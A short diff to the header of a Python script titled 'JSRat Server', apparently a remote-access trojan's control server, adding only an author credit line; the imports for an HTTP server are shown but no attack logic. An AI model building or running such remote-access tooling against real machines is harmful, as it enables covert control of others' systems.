@@ -1,6 +1,7 @@
 #!/usr/bin/env python
 #
 # JSRat Server
+# By: Evi1cg
 #
 import optparse, os, socket, SocketServer, sys , re
 from BaseHTTPServer import BaseHTTPRequestHandler, HTTPServer
